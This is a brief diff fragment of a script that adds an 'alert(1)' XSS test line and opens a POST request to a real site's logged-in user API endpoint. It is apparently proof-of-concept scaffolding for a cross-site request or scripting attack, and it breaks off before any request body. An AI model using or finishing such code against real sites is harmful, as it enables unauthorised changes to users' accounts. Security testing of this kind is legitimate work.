@@ -1,5 +1,5 @@
 <script>
-
+alert(1);
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://www.grailed.com/api/users/me", true);
 
